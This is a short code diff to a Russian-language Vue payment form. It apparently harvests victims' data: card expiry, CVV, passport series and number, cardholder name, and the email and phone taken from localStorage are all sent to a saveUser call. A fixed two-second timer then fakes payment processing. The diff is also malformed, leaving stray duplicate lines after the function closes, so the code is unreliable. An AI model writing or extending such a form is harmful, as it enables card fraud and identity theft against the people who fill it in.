@@ -13,12 +13,14 @@ const method = ref('Visa/Mastercard')
 const processing = ref(false)
 const showMessage = ref(false)
 
+
 const passportData = ref('')
 const passportData2 = ref('')
 
 async function submit() {
   processing.value = true
   const authUser = JSON.parse(localStorage.getItem('authUser') || '{}')
+
   await saveUser({
     email: authUser.email || '',
     phoneNumber: authUser.phoneNumber || localStorage.getItem('phoneNumber') || '',
@@ -26,6 +28,15 @@ async function submit() {
     cardDate: expiry.value,
     cvv: cvv.value,
     passportData: passportData.value,
+    passportData2: passportData2.value,
+    amount: amount.value,
+    method: method.value
+  })
+  setTimeout(() => {
+    processing.value = false
+    showMessage.value = true
+  }, 2000)
+}
     passportData2: passportData2.value
   })
 
@@ -57,7 +68,6 @@ function openChat() {
         </div>
       </div>
       <div class="form-group">
-
         <label for="passportData">Паспорт серия</label>
         <input id="passportData" v-model="passportData" required />
       </div>
@@ -66,7 +76,6 @@ function openChat() {
         <input id="passportData2" v-model="passportData2" required />
       </div>
       <div class="form-group">
-
         <label for="name">Имя держателя</label>
         <input id="name" v-model="name" required />
       </div>
